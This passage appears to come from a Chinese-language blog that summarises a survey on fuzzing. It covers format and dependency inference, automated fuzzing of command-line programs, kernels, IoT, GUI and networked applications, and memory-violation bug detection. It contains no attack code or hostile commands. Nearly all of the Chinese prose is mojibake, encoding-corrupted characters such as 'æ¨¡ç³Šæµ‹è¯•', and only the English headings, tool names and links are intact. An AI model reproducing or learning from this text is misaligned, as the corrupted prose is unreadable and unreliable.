‡è®°ç¢ç‰‡ï¼Œä»…åœ¨ç¢ç‰‡æ»¡è¶³çº¦æŸæ—¶æ‰è¿›è¡Œæ•´åˆ</p></blockquote><h2 id="4-6-Format-Inference"><a href="#4-6-Format-Inference" class="headerlink" title="4.6 Format Inference"></a>4.6 Format Inference</h2><p>è‹¥è¾“å…¥æ¨¡å‹ä¸å¯ç”¨ï¼Œæ¨æ–­è¾“å…¥æ ¼å¼ä¹Ÿæ˜¯å‰æ™¯è¾ƒå¥½çš„è§£å†³æ–¹æ¡ˆï¼Œä¸”ä¸€ä¸ªè¾“å…¥æ¨¡å‹ä»…èƒ½ç”Ÿæˆä¸€ç§ç‰¹å®šæ ¼å¼çš„è¾“å…¥ï¼Œå› æ­¤<strong>æ ¼å¼æ¨æ–­</strong>ï¼ˆformat inferenceï¼‰æ¯”åŸºäºæ¨¡å‹çš„æ–¹æ¡ˆæ›´åŠ çµæ´»</p><h3 id="4-6-1-Corpus-based"><a href="#4-6-1-Corpus-based" class="headerlink" title="4.6.1 Corpus-based"></a>4.6.1 Corpus-based</h3><p>ä¸€ç§ç›´æ¥çš„æ–¹æ¡ˆæ˜¯ä»æœ‰æ•ˆè¾“å…¥è¯­æ–™åº“è¿›è¡Œæ¨æ–­ã€‚ç”±äºç¼ºä¹è¾“å…¥æ¨¡å‹ï¼Œç ”ç©¶è€…å»ºç«‹äº†ç«¯åˆ°ç«¯ï¼ˆend-to-endï¼‰çš„æœºå™¨å­¦ä¹ æ¨¡å‹ä½œä¸ºæ›¿ä»£ï¼Œ<strong>å¾ªç¯ç¥ç»ç½‘ç»œ</strong>ï¼ˆrecurrent neural networkï¼ŒRNNï¼‰è¿™ä¸€æ¨¡å‹æ›´åˆé€‚ç”Ÿæˆç»“æ„åŒ–è¾“å…¥ï¼Œä½†è¿™ä¸€æ›¿ä»£æ–¹æ¡ˆæœ‰å¯èƒ½å—åˆ°ç”Ÿæˆéæ³•è¾“å…¥çš„å½±å“ï¼Œå› æ­¤è®­ç»ƒæ•°æ®éœ€è¦ç›¸åº”çš„æ”¹è¿›</p><blockquote><p>ä¾‹å¦‚ <a href="https://faculty.ist.psu.edu/wu/papers/DeepFuzz.pdf">DeepFuzz</a> ç”Ÿæˆè¯­æ³•æœ‰æ•ˆè¾“å…¥çš„æ¯”ä¾‹ä»…ä¸º 82.63%</p></blockquote><p>æ¨¡ç³Šæµ‹è¯•ä¹Ÿå¯ä»¥åŸºäºæœ‰æ•ˆè¾“å…¥è¯­æ–™åº“åˆæˆä¸€ç§ä¸Šä¸‹æ–‡æ— å…³è¯­æ³•æ¥ç”Ÿæˆé«˜åº¦ç»“æ„åŒ–çš„è¾“å…¥</p><h3 id="4-6-2-Coverage-based"><a href="#4-6-2-Coverage-based" class="headerlink" title="4.6.2 Coverage-based"></a>4.6.2 Coverage-based</h3><p>åŸºäºè¯­æ–™åº“çš„è§£å†³æ–¹æ¡ˆéœ€è¦å¯¹è¾“å…¥è§„åˆ™çš„ç»¼åˆè¦†ç›–ï¼Œå¯èƒ½ä¼šä¸å®é™…ï¼Œæ­¤å¤–å…¶å¹¶æ²¡æœ‰ä½¿ç”¨å†…éƒ¨æ‰§è¡ŒçŠ¶æ€çš„ä¿¡æ¯ï¼Œè¿™å¯èƒ½ä¼šé€ æˆè¾ƒä½çš„ä»£ç è¦†ç›–ç‡</p><p>è¾“å…¥çš„æ ¼å¼æŒ‡ç¤ºäº†è¾“å…¥ä¸­ä¸åŒå­—èŠ‚çš„å…³ç³»ï¼Œå› æ­¤åŸºäºä»£ç è¦†ç›–ï¼Œfuzzer å¯ä»¥æ¨æ–­å­—èŠ‚åˆ°å­—èŠ‚çš„ï¼ˆbyte-to-byteï¼‰å…³ç³»æ¥å¯åŠ¨æ¨¡ç³Šæµ‹è¯•</p><blockquote><p>ä¾‹å¦‚ <a href="https://www.usenix.org/conference/usenixsecurity19/presentation/blazytko">GRIMOIRE</a> ä½¿ç”¨ä»£ç è¦†ç›–æ¥æ¨æ–­ç›®æ ‡ç¨‹åºæ‰€éœ€çš„è¾“å…¥æ ¼å¼</p></blockquote><h3 id="4-6-3-Encoding-Function"><a href="#4-6-3-Encoding-Function" class="headerlink" title="4.6.3 Encoding Function"></a>4.6.3 Encoding Function</h3><p>ä¸ä¸Šè¿°å…³æ³¨äºè¾“å…¥çš„æ–¹æ³•ä¸åŒï¼Œæœ‰çš„ fuzzer æœç´¢ä¼šç¼–ç è¾“å…¥æ ¼å¼çš„ä»£ç åŒºåŸŸï¼Œå› ä¸ºè¿™ç±»ä»£ç ä¸ç”Ÿæˆç»“æ„è‰¯å¥½çš„ï¼ˆwell-structuredï¼‰è¾“å…¥ç›¸å…³ï¼Œæ•… fuzzer åœ¨ç¼–ç æ ¼å¼å‰è¿›è¡Œå˜å¼‚</p><p>å°½ç®¡ PUTs çš„æºç å¯èƒ½æ²¡æ³•è·å–ï¼Œä½†ä»–ä»¬æ‰€ç”Ÿæˆçš„ç»“æ„è‰¯å¥½çš„è¾“å…¥åˆ™ä¸ç„¶ï¼Œä¾‹å¦‚æœ‰çš„ç¤¾åŒºä¼šå¼€æºä¸€äº›ç”Ÿæˆé«˜åº¦ç»“æ„åŒ–è¾“å…¥çš„å·¥å…·</p><p>å¯¹ IOT è®¾å¤‡è€Œè¨€ï¼Œå¤§éƒ¨åˆ†éƒ½é€šè¿‡é…å¥—ç¨‹åºæ¥æ§åˆ¶ï¼Œå› æ­¤é€šè¿‡å®šä½ä¸ç¼–ç æ ¼å¼ç›¸å…³çš„ä»£ç ï¼Œå˜å¼‚å¯ä»¥åœ¨å‡½æ•°çš„å‚æ•°æˆ–æ˜¯è®¡ç®—æ ¼å¼çš„æŒ‡ä»¤ä¸Šå®Œæˆ</p><blockquote><p>ä¾‹å¦‚ <a href="https://www.ndss-symposium.org/wp-content/uploads/2018/03/NDSS2018_01A-1_Chen_Slides.pdf">IOTFuzzer</a> ä¾¿ hook äº†è¿™ç±»å‡½æ•°å¹¶å¯¹å…¶å‚æ•°è¿›è¡Œå˜å¼‚</p></blockquote><h2 id="4-7-Dependency-Inference"><a href="#4-7-Dependency-Inference" class="headerlink" title="4.7 Dependency Inference"></a>4.7 Dependency Inference</h2><p>æ ¼å¼æ¨æ–­ä¸»è¦è§£å†³è¯­æ³•éœ€æ±‚ï¼Œè¿™ä»å¯èƒ½ç”Ÿæˆæœ‰ç€é”™è¯¯æ•°æ®ä¾èµ–é¡¹çš„è¾“å…¥ï¼Œä¾‹å¦‚åœ¨ Fig.6 ä¸­çš„ <code>snippet2</code> ä¸­ï¼Œåœ¨ <code>2-5</code> å‡ºç°äº†ä¸€ä¸ªç”±äº <code>errf()</code> æœªå®šä¹‰å¯¼è‡´çš„é”™è¯¯</p><p><img src="https://s2.loli.net/2022/10/28/pZnh2GsWyLJ4d1g.png" alt="Fig. 6 Semantic error (JavaScript). "></p><p>è®¸å¤šåº”ç”¨éƒ½éœ€è¦åœ¨è¾“å…¥ä¸­æœ‰ç€æ­£ç¡®çš„<strong>æ•°æ®ä¾èµ–é¡¹</strong>ï¼ˆdata dependencyï¼‰ï¼Œé€šå¸¸ç”±ä¸€ç³»åˆ—è¯­å¥ï¼ˆstatementï¼‰ç»„æˆï¼ŒåŒ…æ‹¬ç³»ç»Ÿè°ƒç”¨ã€å¯¹è±¡ã€APIsã€ABIsç­‰</p><h3 id="4-7-1-Documents-or-Source-Code"><a href="#4-7-1-Documents-or-Source-Code" class="headerlink" title="4.7.1 Documents or Source Code"></a>4.7.1 Documents or Source Code</h3><p>åºåˆ—çš„æ•°æ®ä¾èµ–é¡¹é€šå¸¸é€šè¿‡é™æ€åˆ†ææ¥æ¨æ–­ï¼Œå› ä¸ºè®¸å¤šåº”ç”¨éƒ½æœ‰ç›¸åº”çš„æ–‡æ¡£æˆ–æºç ï¼Œå¯ä»¥æ®æ­¤æ¨æ–­æ•°æ®ä¾èµ–é¡¹ï¼Œå¹¶åœ¨æ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹ä¸­åœ¨ç”Ÿæˆè¾“å…¥å‰å…ˆç”Ÿæˆå…¶å…ˆå†³é¡¹ï¼ˆprerequisitesï¼‰</p><p>ä½†é™æ€åˆ†æè¯¯æŠ¥ç‡é«˜ä¸”ä¼šé”™è¿‡æ¥å£çš„ä¾èµ–é¡¹ï¼Œå› æ­¤ä¸€ä¸ªè¾ƒå¥½çš„è§£å†³æ–¹æ¡ˆæ˜¯ç»“åˆé™æ€åˆ†æä¸åŠ¨æ€åˆ†æ</p><h3 id="4-7-2-Real-world-Programs"><a href="#4-7-2-Real-world-Programs" class="headerlink" title="4.7.2 Real-world Programs"></a>4.7.2 Real-world Programs</h3><p>çœŸå®ä¸–ç•Œçš„è®¸å¤šç¨‹åºé€šè¿‡å‘½ä»¤è¡Œæ¥è°ƒç”¨æ¥å£ï¼Œè¿™ä¾¿åŒ…å«äº†æ•°æ®ä¾èµ–é¡¹ï¼Œfuzzing å¯ä»¥åŸºäºè¿™äº›çœŸå®ä¸–ç•Œä¸­ç¨‹åºçš„åˆ‡ç‰‡ç¨‹åºï¼ˆprogram slicingï¼‰ç”Ÿæˆè°ƒç”¨æ¥å£çš„æ–°ç¨‹åº</p><p>æ•°æ®ä¾èµ–é¡¹ä¹Ÿå¯ä»¥é€šè¿‡åˆ†ææ‰§è¡Œæ—¥å¿—ï¼ˆexecution logï¼‰æ¥æ¨æ–­ï¼Œæ—¥å¿—ä¸­æ˜ç¡®åŒ…å«æ¥å£çš„é¡ºåºä¿¡æ¯ï¼ˆä¾‹å¦‚å“ªä¸ªæ¥å£å…ˆè¢«æ‰§è¡Œï¼‰ï¼ŒåŒæ—¶éšå«äº†æ¥å£é—´çš„å‚æ•°ä¾èµ–é¡¹ä¿¡æ¯</p><p>ä¸ºäº†è·å¾—è¿™äº›ç›´æ¥ä¸é—´æ¥çš„ä¿¡æ¯ï¼Œæ¨¡ç³Šæµ‹è¯•åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ hook æ¯ä¸ªæ¥å£å¹¶è®°å½•è‡ªå·±æ‰€éœ€çš„æ•°æ®</p><blockquote><p><strong>Gap 2</strong>ï¼šè¾“å…¥ç©ºé—´çš„å‡å°ä¾èµ–äºå¯¹è¯­æ³•&#x2F;è¯­ä¹‰å…³è”çš„è¾“å…¥å­—èŠ‚çš„åˆ†ç»„ï¼Œåˆ†ç»„çš„ä¼˜ç‚¹æ˜¯åœ¨æ¢ç´¢æ›´å¤šæ‰§è¡ŒçŠ¶æ€ä¸­æå‡æ•ˆç‡ï¼Œç”±æ­¤ fuzzing æ›´å€¾å‘äºæ»¡è¶³è·¯å¾„çº¦æŸä»¥æ¢ç´¢è¢«è¿™äº›çº¦æŸå®ˆæŠ¤çš„æ›´æ·±çš„ä»£ç åŒºåŸŸ</p></blockquote><h1 id="0x05-AUTOMATION"><a href="#0x05-AUTOMATION" class="headerlink" title="0x05. AUTOMATION"></a>0x05. AUTOMATION</h1><p><strong>è‡ªåŠ¨æ‰§è¡Œ</strong>ï¼ˆAutomatic executionï¼‰æ˜¯æ¨¡ç³Šæµ‹è¯•ç†è®ºä¸è¾“å…¥ç©ºé—´å‡æ–¹æ³•çš„åŸºç¡€ï¼Œè€ŒæˆåŠŸçš„æ¨¡ç³Šæµ‹è¯•éœ€è¦ï¼š</p><ul><li><strong>è‡ªåŠ¨é‡å¤åœ°è¿è¡Œ PUTs</strong>ã€‚å¤§éƒ¨åˆ† fuzzer éƒ½èƒ½æµ‹è¯•å‘½ä»¤è¡Œç¨‹åºï¼Œä½†å¯¹äºç¡¬ä»¶æˆ–å¤šè¯­è¨€è½¯ä»¶è€Œè¨€ä¸è¡Œ</li><li><strong>å¯¹æ½œåœ¨æ¼æ´çš„è‡ªåŠ¨æŒ‡ç¤ºå™¨</strong>ï¼ˆautomatic indicatorï¼‰ã€‚å½“å‰ fuzzer ä½¿ç”¨ crashes ä½œä¸ºæ½œåœ¨æ¼æ´çš„æ ‡å¿—ï¼Œä½†å¦‚æ¡ä»¶ç«äº‰ä¸€ç±»çš„æ¼æ´å¹¶ä¸ä¼šè§¦å‘ crash</li><li><strong>é«˜é€Ÿæ‰§è¡Œ</strong>ã€‚åœ¨ç›¸åŒçš„æ—¶é—´å†…æ£€éªŒæ›´å¤šçš„æµ‹è¯•ç”¨ä¾‹ï¼Œä»¥æ­¤å¢åŠ å‘ç°æ¼æ´çš„æœºä¼š</li></ul><h2 id="5-1-Automatic-Execution-of-PUTs"><a href="#5-1-Automatic-Execution-of-PUTs" class="headerlink" title="5.1 Automatic Execution of PUTs"></a>5.1 Automatic Execution of PUTs</h2><p>å¯¹ä¸åŒåº”ç”¨ç¨‹åºçš„è‡ªåŠ¨åŒ–æ¨¡ç³Šæµ‹è¯•éœ€è¦ä¸åŒçš„å·¥ç¨‹åŠªåŠ›ï¼Œæœ¬èŠ‚ä»‹ç»å‡ ç§è‡ªåŠ¨åŒ–æ¨¡ç³Šæµ‹è¯•çš„æ–¹æ³•</p><h3 id="5-1-1-Command-line-Programs"><a href="#5-1-1-Command-line-Programs" class="headerlink" title="5.1.1 Command-line Programs"></a>5.1.1 Command-line Programs</h3><p>æ¨¡ç³Šæµ‹è¯•åœ¨æµ‹è¯•å‘½ä»¤è¡Œç¨‹åºæ—¶é€šè¿‡å­è¿›ç¨‹è¿è¡Œ PUTs å¹¶å°†æ‰€éœ€é€‰é¡¹ï¼ˆoptionsï¼‰ä¸è¾“å…¥å–‚ç»™ç¨‹åºï¼ŒåŒæ—¶åœ¨æ‰§è¡Œ PUT æ—¶å…¶å¹¶ä¸ä¼šé‡å¤æ‰€æœ‰çš„æ­¥éª¤ï¼Œè€Œæ˜¯å…‹éš†å‡ºå­è¿›ç¨‹ä»¥ç•¥è¿‡é¢„å¤„ç†æ­¥éª¤</p><p><em>åœ¨æ•´ä¸ªæ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹ä¸­é€šå¸¸ä»…ç”¨ä¸€ä¸ªå‘½ä»¤è¡Œé€‰é¡¹ï¼ˆå³æ‰€æœ‰è¾“å…¥éƒ½åŸºäºè¯¥é€‰é¡¹æ‰§è¡Œï¼‰ï¼Œå› ä¸ºä¸åŒçš„é€‰é¡¹ä»£è¡¨äº†ä¸åŒçš„ä»£ç è¦†ç›–ï¼Œè€Œä¸€æ¬¡å…¨é¢çš„æµ‹è¯•éœ€è¦åˆ—ä¸¾æ‰€æœ‰çš„é€‰é¡¹ï¼Œå› æ­¤ä¸€ä¸ªé«˜æ•ˆçš„æ–¹æ¡ˆä¾¿æ˜¯è‹¥å¯¹äºä¸€ä¸ªé€‰é¡¹è€Œè¨€å½“å‰è¾“å…¥æ— æ•ˆï¼Œåˆ™è·³è¿‡å‰©ä½™çš„æ‰€æœ‰é€‰é¡¹</em></p><blockquote><p>è¿™é‡Œè®ºæ–‡åŸæ–‡è¯´â€œè¯¥ç§æ–¹æ¡ˆçš„ä¸€ä¸ªé‡è¦çš„è§‚æµ‹æ˜¯è‹¥ä¸€ä¸ªè¾“å…¥å¯¹ä¸€ä¸ªé€‰é¡¹è€Œè¨€æ˜¯æ— æ•ˆçš„ï¼Œåˆ™å…¶ä¹Ÿä¼šå¯¹å…¶ä»–é€‰é¡¹æ— æ•ˆâ€ï¼Œä½†ç¬”è€…è§‰å¾—è¿™ä¸ªè¯´æ³•æœ‰å¤±åé¢‡ï¼ˆ</p></blockquote><h3 id="5-1-2-Deep-Learning-Systems"><a href="#5-1-2-Deep-Learning-Systems" class="headerlink" title="5.1.2 Deep Learning Systems"></a>5.1.2 Deep Learning Systems</h3><p>æµ‹è¯•æ·±åº¦å­¦ä¹ ç³»ç»Ÿï¼ˆDLSï¼‰çš„è¿‡ç¨‹ç±»ä¼¼äºæµ‹è¯•å‘½ä»¤è¡Œï¼Œé€šè¿‡ç”Ÿæˆè¾“å…¥ï¼ˆå¯ä»¥æ˜¯è®­ç»ƒæ•°æ®ã€æµ‹è¯•æ•°æ®æˆ–ä¸åŒç›®æ ‡ä¸Šçš„æ·±åº¦å­¦ä¹ æ¨¡å‹ï¼‰æµ‹è¯• DLSs ä»¥è·å¾—æ›´å¥½çš„ fitnessï¼ˆå¯ä»¥æ˜¯ç¥ç»å…ƒè¦†ç›–ç‡ã€æŸå¤±å‡½æ•°ã€è¿ç®—ç¬¦çº§è¦†ç›–ç‡ï¼‰ï¼ŒåŒæ—¶é™¤äº†æ£€æµ‹ç¼ºé™·ä»¥å¤–ä¹Ÿä¼šæ£€æŸ¥æ¨¡å‹çš„å¥å£®æ€§</p><h3 id="5-1-3-Operating-System-Kernels"><a href="#5-1-3-Operating-System-Kernels" class="headerlink" title="5.1.3 Operating System Kernels"></a>5.1.3 Operating System Kernels</h3><p>OS kernel åŒ…å«äº†è®¸å¤šä¸­æ–­ä¸å†…æ ¸çº¿ç¨‹ï¼Œå…¶æ‰§è¡ŒçŠ¶æ€æ— æ³•ç¡®å®šï¼Œç”±æ­¤æˆ‘ä»¬ä½¿ç”¨ hypervisorï¼ˆå¦‚ QEMUï¼‰æ¥è¿è¡Œå†…æ ¸ï¼Œå¹¶é€šè¿‡ <a href="https://zhangtong16.github.io/2019/06/05/Intel-Processor-Trace/">Intelâ€™s Processor Trace</a> ï¼ˆPTï¼‰æŠ€æœ¯æ¥è·å–ä»£ç è¦†ç›–ï¼›å°½ç®¡è¿™ç§æ–¹æ³•èƒ½å¸¦åé¦ˆåœ°æµ‹è¯•ä¸åŒç§å†…æ ¸ï¼Œä½†ä»éœ€è¦äººå·¥æ„é€ è¯­æ³•&amp;è¯­ä¹‰æ­£ç¡®çš„è¾“å…¥</p><p>å› ä¸ºè¾“å…¥åŒ…æ‹¬æ–‡ä»¶ç³»ç»Ÿé•œåƒæˆ–ä¸€ç³»åˆ—ç³»ç»Ÿè°ƒç”¨ï¼Œfuzzers å¯ä»¥ä»¥æ›´è½»é‡çº§çš„æ–¹æ³•è¿›è¡Œæµ‹è¯•ï¼šåœ¨ç³»ç»Ÿè°ƒç”¨çš„æ•°æ®ä¾èµ–é¡¹è¢«åˆ†æ&#x2F;æ¨æ–­å‡ºæ¥åç”Ÿæˆä¸€ç³»åˆ—ç³»ç»Ÿè°ƒç”¨å¹¶åœ¨ç›®æ ‡å†…æ ¸ä¸Šè¿è¡Œï¼Œå¹¶ç›‘æµ‹ä»£è¡¨æ½œåœ¨æ¼æ´çš„ system panics</p><p>å¦ä¸€ç§æµ‹è¯•æ–¹æ³•æ˜¯é€šè¿‡æ¨¡æ‹Ÿå¤–è®¾å¹¶ç”Ÿæˆç›¸åº”è¾“å…¥æ¥æµ‹è¯•å†…æ ¸é©±åŠ¨</p><h3 id="5-1-4-Cyber-Physical-Systems"><a href="#5-1-4-Cyber-Physical-Systems" class="headerlink" title="5.1.4 Cyber-Physical Systems"></a>5.1.4 Cyber-Physical Systems</h3><p><strong>ä¿¡æ¯ç‰©ç†ç³»ç»Ÿ</strong>ï¼ˆCyber-Physical Systemsï¼ŒCPSï¼‰åŒ…å«ä¸¤ä¸ªç´§å¯†ç»“åˆçš„ä¸»è¦æˆåˆ†ï¼Œå³<strong>è®¡ç®—å…ƒç´ </strong>ï¼ˆcomputational elementsï¼‰ä¸<strong>ç‰©ç†è¿‡ç¨‹</strong>ï¼ˆphysical processesï¼‰</p><p>ä¸€ä¸ªè¢«å¹¿æ³›ä½¿ç”¨çš„è®¡ç®—å…ƒç´ æ˜¯ <em>å¯ç¼–ç¨‹é€»è¾‘æ§åˆ¶å™¨</em> ï¼ˆprogrammable logic controllerï¼ŒPLCï¼‰ï¼Œå…¶æ§åˆ¶ç€ç‰©ç†è¿‡ç¨‹çš„é©±åŠ¨å™¨å¹¶ä»ä¼ æ„Ÿå™¨ä¸­è·å–è¾“å…¥ï¼Œå› æ­¤åœ¨ fuzzing CPSs æ—¶ fuzzer å¯ä»¥æ›¿æ¢æ‰ PLCs å¹¶é€šè¿‡ç½‘ç»œç›´æ¥å‘é©±åŠ¨å™¨å‘é€å¤§é‡çš„å‘½ä»¤</p><p>PLC çš„äºŒè¿›åˆ¶æ–‡ä»¶ä¹Ÿæ˜¯ CPSs çš„ä¸€ä¸ªå¯æµ‹è¯•ç‚¹ï¼Œä½†å…¶æœ‰ç€å¤šç§äºŒè¿›åˆ¶æ ¼å¼ä»¥åŠå¤æ‚çš„ä¸ç‰©ç†å®ä½“é—´çš„é€šä¿¡ï¼›åŸºäºå¯¹ PLC äºŒè¿›åˆ¶æ–‡ä»¶ä¸å¼€å‘å¹³å°çš„åˆ†æï¼Œè‡ªåŠ¨åŒ–çš„ fuzz å¯ä»¥åœ¨å…¶è¿è¡Œåœ¨ PLC è®¾å¤‡ä¸Šæ—¶è¿›è¡Œ</p><h3 id="5-1-5-Internet-of-Things"><a href="#5-1-5-Internet-of-Things" class="headerlink" title="5.1.5 Internet of Things"></a>5.1.5 Internet of Things</h3><p>IOT çš„è‡ªåŠ¨åŒ– fuzzing åŒ…æ‹¬æ¨¡æ‹Ÿä¸ç½‘ç»œçº§æµ‹è¯•ï¼š</p><ul><li>æ¨¡æ‹Ÿå™¨å¯ä»¥åœ¨æ²¡æœ‰å¯¹åº”ç¡¬ä»¶æ—¶è¿è¡Œ IOT å›ºä»¶ï¼Œä»¥ç°ç›’æ¨¡å¼æµ‹è¯•ç›®æ ‡ç¨‹åº</li><li>ç½‘ç»œçº§çš„ fuzzing ä»¥é»‘ç›’æ¨¡å¼è¿›è¡Œæµ‹è¯•ï¼Œå³é€šè¿‡ç½‘ç»œå‘ IOT è®¾å¤‡å‘é€ä¿¡æ¯ï¼Œä»¥å“åº”ä½œä¸ºæ‰§è¡Œç»“æœï¼Œfitness ä¾¿æ˜¯ç±»å‹æ•°é‡</li></ul><h3 id="5-1-6-Applications-with-Graphical-User-Interface"><a href="#5-1-6-Applications-with-Graphical-User-Interface" class="headerlink" title="5.1.6 Applications with Graphical User Interface"></a>5.1.6 Applications with Graphical User Interface</h3><p>GUI ç¨‹åºçš„æ‰§è¡Œæ¯”å‘½ä»¤è¡Œæ…¢å¾—å¤šï¼Œè€Œæ‰§è¡Œé€Ÿåº¦æ˜¯ fuzzing çš„å…³é”®ï¼Œå› æ­¤å¯¹ GUI ç¨‹åºçš„è‡ªåŠ¨åŒ–æµ‹è¯•é€šå¸¸å°† GUI æ›¿æ¢ä¸ºä¸€ç§æ›´å¿«çš„æ–¹æ¡ˆå¹¶ä»¥å‘½ä»¤è¡Œæ¨¡å¼æ‰§è¡Œç›®æ ‡</p><blockquote><p>ä¾‹å¦‚å¯¹ UI æ“ä½œå»ºæ¨¡åä¸ºå®‰å“åº”ç”¨ç”Ÿæˆäº‹ä»¶åºåˆ—ï¼ˆevent sequencesï¼‰</p></blockquote><p>æ­¤å¤–ï¼Œfuzzer ä¹Ÿå¯ä»¥ä½¿ç”¨ <strong>hardness</strong> æ¥å‡†å¤‡æ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œä»¥ç›´æ¥å”¤é†’ GUIs ä¸­çš„ç›®æ ‡å‡½æ•°</p><h3 id="5-1-7-Applications-with-Network"><a href="#5-1-7-Applications-with-Network" class="headerlink" title="5.1.7 Applications with Network"></a>5.1.7 Applications with Network</h3><p>æ™ºèƒ½åˆçº¦ã€åè®®å®ç°ã€äº‘æœåŠ¡ã€Android Native System Servicesã€æœºå™¨äººè£…ç½®ç­‰é€šè¿‡ç½‘ç»œæ¥æ”¶è¾“å…¥ï¼Œç”±æ­¤å¯ä»¥åœ¨æœ¬åœ°ç”Ÿæˆè¾“å…¥åç”±ç›®æ ‡åº”ç”¨è¿œç¨‹æ‰§è¡Œï¼Œè‡ªåŠ¨æµ‹è¯•çš„æ•ˆç‡ä¾èµ–äºç”Ÿæˆè¾“å…¥çš„è´¨é‡ä¸åæ˜ æ‰§è¡ŒçŠ¶æ€çš„ fitness</p><h2 id="5-2-Automatic-Detection-of-Bugs"><a href="#5-2-Automatic-Detection-of-Bugs" class="headerlink" title="5.2 Automatic Detection of Bugs"></a>5.2 Automatic Detection of Bugs</h2><p>å¯¹äºæ¼æ´æ£€æµ‹å™¨ï¼ˆdetectorï¼‰è€Œè¨€æ¼æ´çš„ä»£ç åŒºåŸŸä¸å¯çŸ¥ï¼Œç”šè‡³ä¸çŸ¥é“ç¨‹åºä¸­æ˜¯å¦å­˜åœ¨æ¼æ´ï¼Œå› æ­¤åœ¨è‡ªåŠ¨ fuzzing ä¸­è®°å½•æ½œåœ¨æ¼æ´å°±å˜å¾—ååˆ†é‡è¦ï¼Œæ¼æ´çš„æ ‡å¿—ï¼ˆindicatorï¼‰é€šå¸¸æ˜¯ç¨‹åºæ‰§è¡Œæ—¶å´©æºƒï¼Œä¹Ÿæœ‰ä¸€äº›åŸºäºæ¼æ´æ¨¡å¼ï¼ˆpatternï¼‰è®¾è®¡çš„ä¸“ä¸€è€Œé«˜æ•ˆçš„æŒ‡ç¤ºå™¨</p><p>æœ¬èŠ‚ä¸»è¦ä»‹ç»æˆåŠŸç”± fuzzing å‘ç°çš„å…­ç§æ¼æ´ï¼šå†…å­˜æŸåã€å¹¶å‘æ¼æ´ã€ç®—æ³•å¤æ‚æ€§ã€spectre å‹æ¼æ´ã€æµ‹ä¿¡é“ã€æ•´å‹æ¼æ´</p><h3 id="5-2-1-Memory-violation-Bugs"><a href="#5-2-1-Memory-violation-Bugs" class="headerlink" title="5.2.1 Memory-violation Bugs"></a>5.2.1 Memory-violation Bugs</h3><blockquote><p>è¿™æ®µå¯¹äºæ‰“ Pwn çš„åŒå­¦æ¥è¯´éƒ½æ¯”è¾ƒæ— èŠï¼Œç¬”è€…å°±ä¸ç»†å½•äº†</p></blockquote><p><strong>å†…å­˜æŸåå‹æ¼æ´</strong>ï¼ˆMemory-violation Bugsï¼‰æ˜¯æœ€å¤è€ä¹Ÿæœ€ä¸¥é‡çš„å®‰å…¨æ¼æ´ï¼Œåˆ†ä¸ºä¸¤ç±»ï¼š</p><ul><li><strong>ç©ºé—´å®‰å…¨æŸå</strong>ï¼ˆspatial safety violationï¼‰ï¼šå³éæ³•å†…å­˜è®¿é—®ã€‚å¦‚ Fig.7a ä¾¿æ˜¯ä¸€ä¸ªè¶Šç•Œï¼ˆout-of-boundï¼‰å†…å­˜è®¿é—®  </li><li><strong>æ—¶é—´å®‰å…¨æŸå</strong>ï¼ˆtemporal safety violationï¼‰ï¼šå³éæ³•å†…å­˜å¼•ç”¨ã€‚å¦‚ Fig.7b ä¾¿æ˜¯ä¸€ä¸ª use-after-free æ¼æ´</li></ul><p><img src="https://s2.loli.net/2022/10/30/nAuTKjBHO2JpeXE.png" alt="Fig. 7. Memory violation bugs"></p><p>å°½ç®¡å·²ç»æœ‰ä¸€äº›é’ˆå¯¹å†…å­˜ç ´åå‹æ¼æ´çš„ç¼“è§£æªæ–½ï¼ˆmigrationï¼‰ï¼Œä½†ç”±äºå¼€é”€ã€å…¼å®¹æ€§ã€å¥å£®æ€§ç­‰åŸå› ï¼Œå¤§éƒ¨åˆ†ç¼“è§£æªæ–½å¹¶æœªå®é™…è¢«ä½¿ç”¨</p><blockquote><p>ä¾‹å¦‚ CTF é‡Œæ‰“ kernel pwn é€šå¸¸éƒ½è¦ bypass KPTIï¼Œä½†åœ¨çœŸå®ä¸–ç•Œçš„é«˜æ€§èƒ½åœºæ™¯ä¸‹è¿™ä¸€ç‰¹æ€§é€šå¸¸æ˜¯è¢«å…³é—­çš„</p><blockquote><p>ï¼ˆå¬è¯´åœ¨å®é™…åº”ç”¨ä¸­æœ‰20%ä»¥ä¸Šçš„æ€§èƒ½æŸè€—ï¼Œ<del>ğŸ‘´ä¹Ÿä¸çŸ¥é“æ˜¯ä¸æ˜¯çœŸçš„</del></p></blockquote></blockquote><blockquote><p>è®ºæ–‡ç»™å‡ºäº†ä¸¤ä¸ªä¾‹å­ï¼š</p><ul><li><a href="https://www.usenix.org/conference/usenixsecurity13/technical-sessions/papers/haller">Dowser</a> ï¼šè®¤ä¸ºç¼“å†²åŒºæº¢å‡ºä¸»è¦å‘ç”Ÿäºå¾ªç¯ä¸­å¯¹æ•°ç»„çš„è®¿é—®ï¼Œé€šè¿‡æ’åºå¾ªç¯ä¸­å†…å­˜è®¿é—®æŒ‡ä»¤å¹¶ç»™æ›´é«˜æ’åºçš„è¾“å…¥é«˜ä¼˜å…ˆçº§ååˆ©ç”¨æ±¡ç‚¹åˆ†æä¸æ··åˆæ‰§è¡Œæ±‚è§£é€‰ä¸­è¾“å…¥çš„è·¯å¾„çº¦æŸä»¥æ£€æµ‹ OOB æ¼æ´</li><li><a href="https://dl.acm.org/doi/10.1145/3377811.3380386">UAFL</a>ï¼šç”±äº UAF æ¼æ´é€šå¸¸æ˜¯åˆ†é…â†’é‡Šæ”¾â†’é‡ç”¨ä¸‰æ­¥èµ°ï¼Œè¿™ä¸€æ¼æ´æ¨¡å¼é©±åŠ¨ UAFL ç”Ÿæˆèƒ½å¤Ÿé€æ¸è¦†ç›–ä¸€æ•´åˆ—æ½œåœ¨ UAF æ¼æ´çš„è¾“å…¥ï¼Œæ½œåœ¨ UAF åºåˆ—é€šè¿‡åŸºäºæ¼æ´æ¨¡å¼çš„é™æ€ç±»å‹åˆ†æå®Œæˆ</li></ul></blockquote><h3 id="5-2-2-Concurrency-Bugs"><a href="#5-2-2-Concurrency-Bugs" class="headerlink" title="5.2.2 Concurrency Bugs"></a>5.2.2 Concurrency Bugs</h3><p><strong>å¹¶å‘å‹æ¼æ´</strong>ï¼ˆConcurrency 